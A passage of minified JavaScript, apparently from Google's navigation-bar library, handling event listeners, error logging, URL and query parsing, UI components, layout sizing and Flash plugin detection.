ch.prototype.B=function(a,c){if(this.o)return null;if(c instanceof Array){var d=null,e;for(e in c){var f=this.B(a,c[e]);f&&(d=f)}return d}d=null;this.b&&this.b.type==c&&this.w==a&&(d=this.b,this.b=null);if(e=a.getAttribute("data-eqid"))a.removeAttribute("data-eqid"),(e=this.A[e])?a.removeEventListener?a.removeEventListener(c,e,!1):a.detachEvent&&a.detachEvent("on"+c,e):this.C.log(Error("A`"+a));return d};
ch.prototype.D=function(a,c){this.b=c;this.w=a;c.preventDefault?c.preventDefault():c.returnValue=!1};_.dh=function(a,c){var d;d=c instanceof _.df?c:_.sg(c);a.href=_.ff(d)};eh=function(a,c,d,e){this.b=e;this.H=c;this.O=d;this.A=_.E(_.Wa(a),.001);this.L=_.C(_.z(a,1))&&Math.random()<this.A;c=null!=_.z(a,3)?_.z(a,3):1;this.F=_.E(c,1);this.B=0;a=null!=_.z(a,4)?_.z(a,4):!0;this.D=_.C(a,!0)};_.v(eh,_.Ma);eh.prototype.log=function(a,c){eh.J.log.call(this,a,c);if(this.b&&this.D)throw a;};
eh.prototype.C=function(){return this.b||this.L&&this.B<this.F};eh.prototype.w=function(a,c){try{return _.Oa(_.Na.M(),"lm").sf(a,c)}catch(d){return new _.Ua(this.H,this.O,a,this.A,c)}};eh.prototype.o=function(a){eh.J.o.call(this,a);this.B++};fh=null;_.U=function(){if(!fh){var a=_.cb()||new _.Va,c=_.jb(),d=_.$a();fh=new eh(a,c,d,_.fb)}return fh};_.J=function(a,c){_.U().log(a,c)};
_.Ra("eq",new ch(_.U()));_.gh=function(a){_.ib(function(){var c=window.document.querySelector("."+a);c&&(c=c.querySelector(".gb_ga"))&&_.F("eq").Nd(c,"click")})};
}catch(e){_._DumpException(e)}
try{
var hh=function(){_.hb.w(_.J)};var ih=function(a,c){var d=_.U(),d=_.fg(d,hh);a.addEventListener?a.addEventListener(c,d):a.attachEvent&&a.attachEvent("on"+c,d)};var jh=[1,2],kh=function(a){_.y(this,a,0,jh)};_.v(kh,_.x);var lh=function(){var a=_.H(_.I.M());return _.B(a,kh,17)};
(function(){var a;window.gbar&&window.gbar._DPG?a=window.gbar._DPG[0]||{}:a={};var c;window.gbar&&window.gbar._LDD?c=window.gbar._LDD:c=[];var d=_.jb(),e=_.U();a=new _.Yb(d,lh()||new kh,a,c,e,_.pc());_.Ra("m",a);c=function(){_.u("gbar.qm",(0,_.t)(function(a){try{a()}catch(c){e.log(c)}},this));_.F("api").Ya()};_.C(_.z(d,18),!0)?a.C(c):(d=_.E(_.z(d,19),200),d=(0,_.t)(a.C,a,c,d),_.ib(d))})();ih(window.document,"DOMContentLoaded");ih(window,"load");
_.u("gbar.mls",function(){});var mh=_.jb(),nh=_.B(mh,_.Ea,8)||new _.Ea,oh;oh=_.z(nh,2);var ph=_.E(oh),qh;qh=_.z(nh,4);var rh=_.D(qh),sh=_.D(_.z(nh,3)),th;th=_.z(nh,5);var uh=_.D(th),vh;vh=null!=_.z(nh,1)?_.z(nh,1):1;var wh=_.E(vh,1);_.z(nh,6);_.z(nh,7);_.u("gbar.bv",{n:ph,r:rh,f:sh,e:uh,m:wh});_.u("gbar.kn",function(){return!0});_.u("gbar.sb",function(){return!1});
}catch(e){_._DumpException(e)}
try{
var rc=function(a,c){a.B.push(c)},sc=function(a,c,d){this.B=a;this.o=!1;this.b=c;this.w=d};sc.prototype.Ya=function(a){if(this.o)throw Error("u`"+this.b);try{a.apply(this.B,this.w),this.o=!0}catch(c){}};var tc=function(a){_.G.call(this);this.w=a;this.b=[];this.o={}};_.v(tc,_.G);tc.prototype.B=function(a){var c=(0,_.t)(function(){this.b.push(new sc(this.w,a,Array.prototype.slice.call(arguments)))},this);return this.o[a]=c};
tc.prototype.Ya=function(){for(var a=this.b.length,c=this.b,d=[],e=0;e<a;++e){var f=c[e].b,g;a:{g=this.w;for(var h=f.split("."),l=h.length,q=0;q<l;++q)if(g[h[q]])g=g[h[q]];else{g=null;break a}g=g instanceof Function?g:null}if(g&&g!=this.o[f])try{c[e].Ya(g)}catch(r){}else d.push(c[e])}this.b=d.concat(c.slice(a))};
var uc="bbh bbr bbs has prm sngw so".split(" "),vc=new tc(_.m);_.Ra("api",vc);
for(var wc="addExtraLink addLink aomc asmc close cp.c cp.l cp.me cp.ml cp.rc cp.rel ela elc elh gpca gpcr lGC lPWF ldb mls noam paa pc pca pcm pw.clk pw.hvr qfaae qfaas qfaau qfae qfas qfau qfhi qm qs qsi rtl sa setContinueCb snaw sncw som sp spd spn spp sps tsl tst up.aeh up.aop up.dpc up.iic up.nap up.r up.sl up.spd up.tp upel upes upet".split(" ").concat(uc),xc=(0,_.t)(vc.B,vc),yc=0;yc<wc.length;yc++){var zc="gbar."+wc[yc];null==_.p(zc,window)&&_.u(zc,xc(zc))}_.u("gbar.up.gpd",function(){return""});
(function(){for(var a=function(a){return function(){_.qc(44,{n:a})}},c=0;c<uc.length;c++){var d="gbar."+uc[c];_.u(d,a(d))}var e=_.Na.M();_.Oa(e,"api").Ya();rc(_.Oa(e,"m"),function(){_.Oa(e,"api").Ya()})})();
}catch(e){_._DumpException(e)}
try{
var xh,Fh,Hh,Qh,Ih,Kh,Jh,Nh,Lh,Gh,Rh;xh=function(a,c){for(var d=a.split("&"),e=0;e<d.length;e++){var f=d[e].indexOf("="),g=null,h=null;0<=f?(g=d[e].substring(0,f),h=d[e].substring(f+1)):g=d[e];c(g,h?(0,window.decodeURIComponent)(h.replace(/\+/g," ")):"")}};_.yh=function(a){return _.ra.concat.apply(_.ra,arguments)};
_.zh=function(a,c){this.nb=this.A=this.o="";this.B=null;this.w=this.C="";this.b=!1;var d;a instanceof _.zh?(this.b=_.n(c)?c:a.b,_.Ah(this,a.o),this.A=a.A,_.Bh(this,a.nb),_.Ch(this,a.B),_.Dh(this,a.Ua()),_.Eh(this,a.Fa.clone()),this.w=a.w):a&&(d=_.Mf(String(a)))?(this.b=!!c,_.Ah(this,d[1]||"",!0),this.A=Fh(d[2]||""),_.Bh(this,d[3]||"",!0),_.Ch(this,d[4]),_.Dh(this,d[5]||"",!0),_.Eh(this,d[6]||"",!0),this.w=Fh(d[7]||"")):(this.b=!!c,this.Fa=new Gh(null,0,this.b))};
_.zh.prototype.toString=function(){var a=[],c=this.o;c&&a.push(Hh(c,Ih,!0),":");if(c=this.nb){a.push("//");var d=this.A;d&&a.push(Hh(d,Ih,!0),"@");a.push((0,window.encodeURIComponent)(String(c)).replace(/%25([0-9a-fA-F]{2})/g,"%$1"));c=this.B;null!=c&&a.push(":",String(c))}if(c=this.Ua())this.nb&&"/"!=c.charAt(0)&&a.push("/"),a.push(Hh(c,"/"==c.charAt(0)?Jh:Kh,!0));(c=this.Fa.toString())&&a.push("?",c);(c=this.w)&&a.push("#",Hh(c,Lh));return a.join("")};_.zh.prototype.clone=function(){return new _.zh(this)};
_.Ah=function(a,c,d){a.o=d?Fh(c,!0):c;a.o&&(a.o=a.o.replace(/:$/,""));return a};_.Bh=function(a,c,d){a.nb=d?Fh(c,!0):c;return a};_.Ch=function(a,c){if(c){c=Number(c);if((0,window.isNaN)(c)||0>c)throw Error("E`"+c);a.B=c}else a.B=null;return a};_.zh.prototype.Ua=function(){return this.C};_.Dh=function(a,c,d){a.C=d?Fh(c,!0):c;return a};_.Eh=function(a,c,d){c instanceof Gh?(a.Fa=c,Mh(a.Fa,a.b)):(d||(c=Hh(c,Nh)),a.Fa=new Gh(c,0,a.b));return a};_.Oh=function(a,c,d){a.Fa.set(c,d);return a};
_.Ph=function(a){return a instanceof _.zh?a.clone():new _.zh(a,void 0)};Fh=function(a,c){return a?c?(0,window.decodeURI)(a.replace(/%25/g,"%2525")):(0,window.decodeURIComponent)(a):""};Hh=function(a,c,d){return _.ea(a)?(a=(0,window.encodeURI)(a).replace(c,Qh),d&&(a=a.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),a):null};Qh=function(a){a=a.charCodeAt(0);return"%"+(a>>4&15).toString(16)+(a&15).toString(16)};Ih=/[#\/\?@]/g;Kh=/[\#\?:]/g;Jh=/[\#\?]/g;Nh=/[\#\?@]/g;Lh=/#/g;
Gh=function(a,c,d){this.w=this.b=null;this.o=a||null;this.B=!!d};Rh=function(a){a.b||(a.b=new _.Ud,a.w=0,a.o&&xh(a.o,function(c,d){a.add((0,window.decodeURIComponent)(c.replace(/\+/g," ")),d)}))};Gh.prototype.add=function(a,c){Rh(this);this.o=null;a=Sh(this,a);var d=this.b.get(a);d||this.b.set(a,d=[]);d.push(c);this.w++;return this};Gh.prototype.remove=function(a){Rh(this);a=Sh(this,a);return _.Wd(this.b.o,a)?(this.o=null,this.w-=this.b.get(a).length,this.b.remove(a)):!1};
Gh.prototype.clear=function(){this.b=this.o=null;this.w=0};Gh.prototype.dc=function(){Rh(this);return 0==this.w};var Th=function(a,c){Rh(a);c=Sh(a,c);return _.Wd(a.b.o,c)};_.k=Gh.prototype;_.k.Ka=function(){Rh(this);for(var a=this.b.La(),c=this.b.Ka(),d=[],e=0;e<c.length;e++)for(var f=a[e],g=0;g<f.length;g++)d.push(c[e]);return d};_.k.La=function(a){Rh(this);var c=[];if(_.ea(a))Th(this,a)&&(c=_.yh(c,this.b.get(Sh(this,a))));else{a=this.b.La();for(var d=0;d<a.length;d++)c=_.yh(c,a[d])}return c};
_.k.set=function(a,c){Rh(this);this.o=null;a=Sh(this,a);Th(this,a)&&(this.w-=this.b.get(a).length);this.b.set(a,[c]);this.w++;return this};_.k.get=function(a,c){var d=a?this.La(a):[];return 0<d.length?String(d[0]):c};
_.k.toString=function(){if(this.o)return this.o;if(!this.b)return"";for(var a=[],c=this.b.Ka(),d=0;d<c.length;d++)for(var e=c[d],f=(0,window.encodeURIComponent)(String(e)),e=this.La(e),g=0;g<e.length;g++){var h=f;""!==e[g]&&(h+="="+(0,window.encodeURIComponent)(String(e[g])));a.push(h)}return this.o=a.join("&")};_.k.clone=function(){var a=new Gh;a.o=this.o;this.b&&(a.b=this.b.clone(),a.w=this.w);return a};
var Sh=function(a,c){var d=String(c);a.B&&(d=d.toLowerCase());return d},Mh=function(a,c){c&&!a.B&&(Rh(a),a.o=null,a.b.forEach(function(a,c){var f=c.toLowerCase();c!=f&&(this.remove(c),this.remove(f),0<a.length&&(this.o=null,this.b.set(Sh(this,f),_.Oc(a)),this.w+=a.length))},a));a.B=c};

}catch(e){_._DumpException(e)}
try{
_.Uh=function(){};_.ba(_.Uh);_.Uh.prototype.b=0;_.Vh=function(a){return":"+(a.b++).toString(36)};
}catch(e){_._DumpException(e)}
try{
var Wh,Xh,$h,ai;Wh=function(a,c,d,e){_.ra.splice.apply(a,_.Tc(arguments,1))};Xh=function(a,c){return c in a?a[c]:void 0};_.V=function(a){_.P.call(this);this.o=a||_.zf();this.Z=Yh;this.da=null;this.ia=!1;this.G=null;this.O=void 0;this.F=this.B=this.b=this.A=null;this.pa=!1};_.v(_.V,_.P);_.V.prototype.za=_.Uh.M();var Yh=null;_.V.prototype.getId=function(){return this.da||(this.da=_.Vh(this.za))};_.V.prototype.S=function(){return this.G};_.Zh=function(a){a.O||(a.O=new _.Re(a));return a.O};
$h=function(a,c){if(a==c)throw Error("G");var d;if(d=c&&a.b&&a.da){d=a.b;var e=a.da;d=d.F&&e?Xh(d.F,e)||null:null}if(d&&a.b!=c)throw Error("G");a.b=c;_.V.J.Sd.call(a,c)};_.V.prototype.Sd=function(a){if(this.b&&this.b!=a)throw Error("H");_.V.J.Sd.call(this,a)};_.V.prototype.qb=function(){this.G=this.o.createElement("DIV")};_.V.prototype.wb=function(a){ai(this,a)};ai=function(a,c,d){if(a.ia)throw Error("I");a.G||a.qb();c?c.insertBefore(a.G,d||null):a.o.b.body.appendChild(a.G);a.b&&!a.b.ia||a.ka()};
_.bi=function(a,c){if(a.ia)throw Error("I");if(c){a.pa=!0;var d=_.uf(c);a.o&&a.o.b==d||(a.o=_.zf(c));a.Xa(c);a.ka()}else throw Error("J");};_.k=_.V.prototype;_.k.Xa=function(a){this.G=a};_.k.ka=function(){this.ia=!0;_.ci(this,function(a){!a.ia&&a.S()&&a.ka()})};_.k.va=function(){_.ci(this,function(a){a.ia&&a.va()});this.O&&_.Ue(this.O);this.ia=!1};
_.k.P=function(){this.ia&&this.va();this.O&&(this.O.aa(),delete this.O);_.ci(this,function(a){a.aa()});!this.pa&&this.G&&_.of(this.G);this.b=this.A=this.G=this.F=this.B=null;_.V.J.P.call(this)};
_.k.hb=function(a,c,d){if(a.ia&&(d||!this.ia))throw Error("I");if(0>c||c>_.di(this))throw Error("K");this.F&&this.B||(this.F={},this.B=[]);if(a.b==this){var e=a.getId();this.F[e]=a;_.Yd(this.B,a)}else{var e=this.F,f=a.getId();if(f in e)throw Error("c`"+f);e[f]=a}$h(a,this);Wh(this.B,c,0,a);a.ia&&this.ia&&a.b==this?(d=this.G,c=d.childNodes[c]||null,c!=a.S()&&d.insertBefore(a.S(),c)):d?(this.G||this.qb(),c=_.ei(this,c+1),ai(a,this.G,c?c.G:null)):this.ia&&!a.ia&&a.G&&a.G.parentNode&&1==a.G.parentNode.nodeType&&
a.ka()};_.di=function(a){return a.B?a.B.length:0};_.ei=function(a,c){return a.B?a.B[c]||null:null};_.ci=function(a,c,d){a.B&&(0,_.ta)(a.B,c,d)};_.V.prototype.removeChild=function(a,c){if(a){var d=_.ea(a)?a:a.getId();a=this.F&&d?Xh(this.F,d)||null:null;if(d&&a){var e=this.F;d in e&&delete e[d];_.Yd(this.B,a);c&&(a.va(),a.G&&_.of(a.G));$h(a,null)}}if(!a)throw Error("L");return a};
}catch(e){_._DumpException(e)}
try{
_.fj=function(a,c,d){_.G.call(this);this.o=a;this.B=c||0;this.w=d;this.b=(0,_.t)(this.A,this)};_.v(_.fj,_.G);_.fj.prototype.da=0;_.fj.prototype.P=function(){_.fj.J.P.call(this);_.gj(this);delete this.o;delete this.w};_.hj=function(a){_.gj(a);a.da=_.af(a.b,_.n(void 0)?void 0:a.B)};_.gj=function(a){0!=a.da&&_.m.clearTimeout(a.da);a.da=0};_.fj.prototype.A=function(){this.da=0;this.o&&this.o.call(this.w)};
_.ij=function(a,c){if("textContent"in a)a.textContent=c;else if(3==a.nodeType)a.data=c;else if(a.firstChild&&3==a.firstChild.nodeType){for(;a.lastChild!=a.firstChild;)a.removeChild(a.lastChild);a.firstChild.data=c}else _.pf(a),a.appendChild(_.uf(a).createTextNode(String(c)))};_.jj=function(a){for(var c in a)return!1;return!0};
}catch(e){_._DumpException(e)}
try{
var lj,mj;_.kj=function(a){return _.Lb&&void 0!=a.children?a.children:(0,_.ua)(a.childNodes,function(a){return 1==a.nodeType})};lj={IMG:" ",BR:"\n"};mj={SCRIPT:1,STYLE:1,HEAD:1,IFRAME:1,OBJECT:1};_.nj=function(a,c,d){if(!(a.nodeName in mj))if(3==a.nodeType)d?c.push(String(a.nodeValue).replace(/(\r\n|\r|\n)/g,"")):c.push(a.nodeValue);else if(a.nodeName in lj)c.push(lj[a.nodeName]);else for(a=a.firstChild;a;)_.nj(a,c,d),a=a.nextSibling};
_.oj=_.K&&!_.L("12")||_.ub&&_.L("1.9.3");
}catch(e){_._DumpException(e)}
try{
_.il=function(a,c,d){a.b||(a.b={});if(!a.b[d]){for(var e=_.z(a,d),f=[],g=0;g<e.length;g++)f[g]=new c(e[g]);a.b[d]=f}c=a.b[d];c==_.Da&&(c=a.b[d]=[]);return c};_.jl=function(a){_.P.call(this);this.G=a;a=_.K?"focusout":"blur";this.b=_.O(this.G,_.K?"focusin":"focus",this,!_.K);this.o=_.O(this.G,a,this,!_.K)};_.v(_.jl,_.P);_.jl.prototype.handleEvent=function(a){var c=new _.oe(a.b);c.type="focusin"==a.type||"focus"==a.type?"focusin":"focusout";this.dispatchEvent(c)};_.jl.prototype.P=function(){_.jl.J.P.call(this);_.ye(this.b);_.ye(this.o);delete this.G};

}catch(e){_._DumpException(e)}
try{
var kl;kl=function(){return(_.nb("Chrome")||_.nb("CriOS"))&&!_.ob()&&!_.pb()};_.ll=_.nb("Firefox");_.ml=_.sb()||_.nb("iPod");_.nl=_.nb("iPad");!_.nb("Android")||kl()||_.nb("Firefox")||_.ob();_.ol=kl();
}catch(e){_._DumpException(e)}
try{
_.No={bi:"onError",ci:"onInfo",Xh:"hideNotificationWidget",gi:"postSharedMessage",hi:"reauth",ki:"setNotificationWidgetHeight",li:"setNotificationWidgetSize",mi:"switchTo",Zh:"navigateTo",ji:"setNotificationText",ii:"setNotificationAnimation"};_.Oo=function(a){(0,window.isFinite)(a)&&(a=String(a));return _.ea(a)?/^\s*-?0x/i.test(a)?(0,window.parseInt)(a,16):(0,window.parseInt)(a,10):window.NaN};
var Po=!1,Qo="",Ro=function(a){a=a.match(/[\d]+/g);if(!a)return"";a.length=3;return a.join(".")};
if(window.navigator.plugins&&window.navigator.plugins.length){var So=window.navigator.plugins["Shockwave Flash"];So&&(Po=!0,So.description&&(Qo=Ro(So.description)));window.navigator.plugins["Shockwave Flash 2.0"]&&(Po=!0,Qo="2.0.0.11")}else if(window.navigator.mimeTypes&&window.navigator.mimeTypes.length){var To=window.navigator.mimeTypes["application/x-shockwave-flash"];(Po=To&&To.enabledPlugin)&&(Qo=Ro(To.enabledPlugin.description))}else try{var Uo=new window.ActiveXObject("ShockwaveFlash.ShockwaveFlash.7"),
Po=!0,Qo=Ro(Uo.GetVariable("$version"))}catch(Vo){try{Uo=new window.ActiveXObject("ShockwaveFlash.ShockwaveFlash.6"),Po=!0,Qo="6.0.21"}catch(Wo){try{Uo=new window.ActiveXObject("ShockwaveFlash.ShockwaveFlash"),Po=!0,Qo=Ro(Uo.GetVariable("$version"))}catch(Xo){}}}_.Yo=Qo;
var Zo=function(a){a||_.zf();_.Ud.call(this)};_.v(Zo,_.Ud);Zo.prototype.A=null;Zo.prototype.G=null;Zo.prototype.set=function(a,c,d){_.Ud.prototype.set.call(this,a,c);d&&(this.A=a);return this};var $o=function(a,c,d,e){return a.set(c.key,c.caption,d,e)};Zo.prototype.wb=function(){if(this.G){_.mf(this.G,_.Wb);var a=_.zf(this.G);this.forEach(function(c,d){var e=a.o("BUTTON",{name:d},c);d==this.A&&(e.className="gb_4a-buttonset-default");this.G.appendChild(e)},this)}};Zo.prototype.S=function(){return this.G};
var ap={key:"ok",caption:"OK"},bp={key:"cancel",caption:"Cancel"},cp={key:"yes",caption:"Yes"},dp={key:"no",caption:"No"},ep={key:"save",caption:"Save"},fp={key:"continue",caption:"Continue"};"undefined"!=typeof window.document&&($o(new Zo,ap,!0,!0),$o($o(new Zo,ap,!0),bp,!1,!0),$o($o(new Zo,cp,!0),dp,!1,!0),$o($o($o(new Zo,cp),dp,!0),bp,!1,!0),$o($o($o(new Zo,fp),ep),bp,!0,!0));

}catch(e){_._DumpException(e)}
try{
var gp=function(a){_.y(this,a,0,null)};_.v(gp,_.x);var hp=function(a){var c=window.document.getElementById("gbqld");c&&(c.style.display=a?"none":"block",c=window.document.getElementById("gbql"))&&(c.style.display=a?"block":"none")},ip=["gbq1","gbq2","gbqfbwa"],jp=function(a,c){var d={};d._sn=["v.gas",c].join(".");_.J(a,d)};
var kp=function(){};var lp=function(a,c,d){this.o=a;this.w=c;this.b=d||_.m};var mp=function(){this.b=[]};mp.prototype.C=function(a,c,d){this.H(a,c,d);this.b.push(new lp(a,c,d))};mp.prototype.H=function(a,c,d){d=d||_.m;for(var e=0,f=this.b.length;e<f;e++){var g=this.b[e];if(g.o==a&&g.w==c&&g.b==d){this.b.splice(e,1);break}}};mp.prototype.A=function(a){for(var c=0,d=this.b.length;c<d;c++){var e=this.b[c];"hrc"==e.o&&e.w.call(e.b,a)}};
var np,pp,qp,rp,sp;np=null;_.op=function(){if(null!=np)return np;var a=window.document.body.style;if(!(a="flexGrow"in a||"webkitFlexGrow"in a))a:{if(a=window.navigator.userAgent){var c=/Trident\/(\d+)/.exec(a);if(c&&7<=Number(c[1])){a=/\bMSIE (\d+)/.exec(a);a=!a||"10"==a[1];break a}}a=!1}return np=a};
pp=function(a,c,d){var e=window.NaN;window.getComputedStyle&&(a=window.getComputedStyle(a,null).getPropertyValue(c))&&"px"==a.substr(a.length-2)&&(e=d?(0,window.parseFloat)(a.substr(0,a.length-2)):(0,window.parseInt)(a.substr(0,a.length-2),10));return e};
qp=function(a){var c=a.offsetWidth,d=pp(a,"width");if(!(0,window.isNaN)(d))return c-d;var e=a.style.padding,f=a.style.paddingLeft,g=a.style.paddingRight;a.style.padding=a.style.paddingLeft=a.style.paddingRight=0;d=a.clientWidth;a.style.padding=e;a.style.paddingLeft=f;a.style.paddingRight=g;return c-d};
rp=function(a){var c=pp(a,"min-width");if(!(0,window.isNaN)(c))return c;var d=a.style.width,e=a.style.padding,f=a.style.paddingLeft,g=a.style.paddingRight;a.style.width=a.style.padding=a.style.paddingLeft=a.style.paddingRight=0;c=a.clientWidth;a.style.width=d;a.style.padding=e;a.style.paddingLeft=f;a.style.paddingRight=g;return c};sp=function(a,c){c||-.5!=a-Math.round(a)||(a-=.5);return Math.round(a)}; _.tp=function(a){if(a){var c=a.style.opacity;a.style.opacity=".99";_.Zd(a.offsetWidth);a.style.opacity=c}};
var up=function(a){_.G.call(this);this.b=a;this.o=[];this.w=[]};_.v(up,_.G);up.prototype.P=function(){up.J.P.call(this);this.b=null;for(var a=0;a<this.o.length;a++)this.o[a].aa();for(a=0;a<this.w.length;a++)this.w[a].aa();this.o=this.w=null};
up.prototype.Pa=function(a){void 0==a&&(a=this.b.offsetWidth);for(var c=qp(this.b),d=[],e=0,f=0,g=0,h=0,l=0;l<this.o.length;l++){var q=this.o[l],r=vp(q),w=qp(q.b);d.push({item:q,lb:r,th:w,uc:0});e+=r.Fc;f+=r.Uc;g+=r.Sb;h+=w}a=a-h-c-g;e=0<a?e:f;f=a;c=d;do{g=!0;h=[];for(l=q=0;l<c.length;l++){var r=c[l],w=0<f?r.lb.Fc:r.lb.Uc,A=0==e?0:w/e*f+r.uc,A=sp(A,g),g=!g;r.uc=wp(r.item,A,r.th,r.lb.Sb);0<w&&A==r.uc&&(h.push(r),q+=w)}c=h;f=a-(0,_.wa)(d,function(a,c){return a+c.uc},0);e=q}while(0!=f&&0!=c.length);
for(l=0;l<this.w.length;l++)this.w[l].Pa()};var yp=function(a){var c={};c.items=(0,_.va)(a.o,function(a){return xp(a)});c.children=(0,_.va)(a.w,function(a){return yp(a)});return c},zp=function(a,c){for(var d=0;d<a.o.length;d++)a.o[d].b.style.width=c.items[d];for(d=0;d<a.w.length;d++)zp(a.w[d],c.children[d])};up.prototype.S=function(){return this.b};
var Ap=function(a,c,d,e){up.call(this,a);this.A=c;this.C=d;this.B=e};_.v(Ap,up);
var vp=function(a,c){var d=a.A,e=a.C,f;if(-1==a.B){var g=c;void 0==g&&(g=qp(a.b));f=xp(a);var h=yp(a),l=pp(a.b,"width",!0);(0,window.isNaN)(l)&&(l=a.b.offsetWidth-g);g=Math.ceil(l);a.b.style.width=f;zp(a,h);f=g}else f=a.B;return{Fc:d,Uc:e,Sb:f}},wp=function(a,c,d,e){void 0==d&&(d=qp(a.b));void 0==e&&(e=vp(a,d).Sb);c=e+c;0>c&&(c=0);a.b.style.width=c+"px";d=a.b.offsetWidth-d;a.b.style.width=d+"px";return d-e},xp=function(a){var c=a.b.style.width;a.b.style.width="";return c};
var Bp=function(a,c,d){var e;void 0==e&&(e=-1);return{className:a,lb:{Fc:c||0,Uc:d||0,Sb:e}}},Cp={className:"gb_6b",items:[Bp("gb_W"),Bp("gb_kc"),Bp("gb_Pb",0,2),Bp("gb_lc"),Bp("gb_e",1,1)],jb:[{className:"gb_e",items:[Bp("gb_Lc",0,1),Bp("gb_ba",0,1)],jb:[function(a){a=a.gb_Lc;var c;if(a)c=a.S();else{c=window.document.querySelector(".gb_Lc");if(!c)return null;a=new up(c)}c=c.querySelectorAll(".gb_na");for(var d=0;d<c.length;d++){var e;if(_.Qf(c[d],"gb_oa")){e=new Ap(c[d],0,1,-1);var f=c[d].querySelector(".gb_ma");
f&&(f=new Ap(f,0,1,-1),e.o.push(f),a.w.push(e))}else e=new Ap(c[d],0,0,-1);a.o.push(e)}return a},{className:"gb_ba",items:[Bp("gb_Fa"),Bp("gb_9a"),Bp("gb_2b"),Bp("gb_p",0,1),Bp("gb_Mc"),Bp("gb_j",0,1),Bp("gb_Nc"),Bp("gb_nc")],jb:[{className:"gb_p",items:[Bp("gb_s",0,1)],jb:[{className:"gb_s",items:[Bp("gb_l",0,1)],jb:[]}]}]}]},{className:"gb_hc",items:[Bp("gbqff",1,1),Bp("gb_gc")],jb:[]}]},Dp=function(a,c){var d=c;if(!d){d=window.document.querySelector("."+a.className);if(!d)return null;d=new up(d)}for(var e=
{},f=0;f<a.items.length;f++){var g=a.items[f],h;h=g;var l=window.document.querySelector("."+h.className);if(h=l?new Ap(l,h.lb.Fc,h.lb.Uc,h.lb.Sb):null)d.o.push(h),e[g.className]=h}for(f=0;f<a.jb.length;f++){var g=a.jb[f],q;"function"==typeof g?q=g(e):q=Dp(g,e[g.className]);q&&d.w.push(q)}return d};
_.Fp=function(a,c){_.G.call(this);this.T=c;this.D=new mp;this.o=window.document.getElementById("gb");this.L=(this.b=window.document.querySelector(".gb_e"))?this.b.querySelector(".gb_ba"):null;this.F=[];this.ee=_.E(_.z(a,5),60);this.O=_.z(a,4);this.Eh=_.E(_.z(a,2),152);this.Gf=_.E(_.z(a,1),30);this.w=null;this.He=_.C(_.z(a,3),!0);this.B=1;this.o&&this.O&&(this.o.style.minWidth=this.O+"px");this.af();this.He&&(this.o&&(Ep(this),_.Q(this.o,"gb_pa"),this.b&&_.Q(this.b,"gb_pa"),_.op()||(this.w=Dp(Cp))),
this.Pa(),window.setTimeout((0,_.t)(this.Pa,this),0));_.u("gbar.elc",(0,_.t)(this.Ah,this));_.u("gbar.ela",_.Ac);_.u("gbar.elh",(0,_.t)(this.mf,this))};_.v(_.Fp,_.G);_.Pa(_.Fp,"el");var Gp=function(){var a=_.Fp.Qh();return{es:a?{f:a.Eh,h:a.ee,m:a.Gf}:{f:152,h:60,m:30},mo:"md",vh:window.innerHeight||0,vw:window.innerWidth||0}};_.k=_.Fp.prototype;_.k.P=function(){_.Fp.J.P.call(this)};_.k.Pa=function(a){a&&Ep(this);this.w&&this.w.Pa(Math.max(window.document.documentElement.clientWidth,rp(this.o)));_.tp(this.b)};
_.k.Ng=function(){try{var a=window.document.getElementById("gb"),c=a.querySelector(".gb_e");_.R(a,"gb_3c");c&&_.R(c,"gb_3c");for(var a=0,d;d=ip[a];a++){var e=window.document.getElementById(d);e&&_.R(e,"gbqfh")}hp(!1)}catch(f){jp(f,"rhcc")}this.Pa(!0)};_.k.Fh=function(){try{var a=window.document.getElementById("gb"),c=a.querySelector(".gb_e");_.Q(a,"gb_3c");c&&_.Q(c,"gb_3c");for(var a=0,d;d=ip[a];a++){var e=window.document.getElementById(d);e&&_.Q(e,"gbqfh")}hp(!0)}catch(f){jp(f,"ahcc")}this.Pa(!0)};
_.k.af=function(){if(this.o){var a=this.o.offsetWidth;0==this.B?900<=a&&(this.B=1,this.A(new kp)):900>a&&(this.B=0,this.A(new kp))}};_.k.Ah=function(a){this.F.push(a)};_.k.mf=function(a){var c=Gp().es.h;this.ee=c+a;for(a=0;a<this.F.length;a++)try{this.F[a](Gp())}catch(d){this.T.log(d)}};var Ep=function(a){if(a.b){var c;a.w&&(c=yp(a.w));_.Q(a.b,"gb_t");a.b.style.minWidth=a.b.offsetWidth-qp(a.b)+"px";a.L.style.minWidth=a.L.offsetWidth-qp(a.L)+"px";_.R(a.b,"gb_t");c&&zp(a.w,c)}}; _.Fp.prototype.C=function(a,c,d){this.D.C(a,c,d)};_.Fp.prototype.H=function(a,c){this.D.H(a,c)};_.Fp.prototype.A=function(a){this.D.A(a)};
_.ib(function(){var a=_.H(_.I.M()),a=_.B(a,gp,21)||new gp,c=_.U(),a=new _.Fp(a,c);_.Ra("el",a);_.u("gbar.gpca",(0,_.t)(a.Fh,a));_.u("gbar.gpcr",(0,_.t)(a.Ng,a))});_.u("gbar.elr",Gp);
}catch(e){_._DumpException(e)}
try{
_.ib(function(){var a=window.document.querySelector(".gb_0");a&&_.F("eq").Nd(a,"click")});
}catch(e){_._DumpException(e)}
try{
_.gh("gb_2b");
}catch(e){_._DumpException(e)}
try{
_.gh("gb_9a");
}catch(e){_._DumpException(e)}
try{
_.u("gbar.qfgw",(0,_.t)(window.document.getElementById,window.document,"gbqfqw"));_.u("gbar.qfgq",(0,_.t)(window.document.getElementById,window.document,"gbqfq"));_.u("gbar.qfgf",(0,_.t)(window.document.getElementById,window.document,"gbqf"));_.u("gbar.qfsb",(0,_.t)(window.document.getElementById,window.document,"gbqfb"));

}catch(e){_._DumpException(e)}
try{
var Aw=[3,5],Bw=function(a){_.y(this,a,0,Aw)};_.v(Bw,_.x);var Cw=function(){var a=_.H(_.I.M());return _.B(a,Bw,16)},Dw=function(a){this.w=_.Fp.M();this.o=a};Dw.prototype.b=function(a,c){0==this.w.B?(_.Q(a,"gb_ra"),c?(_.R(a,"gb_o"),_.Q(a,"gb_Oc")):(_.R(a,"gb_Oc"),_.Q(a,"gb_o"))):_.Sf(a,["gb_ra","gb_o","gb_Oc"])};_.u("gbar.sos",function(){return window.document.querySelectorAll(".gb_jc")});_.u("gbar.si",function(){return window.document.querySelector(".gb_ic")});
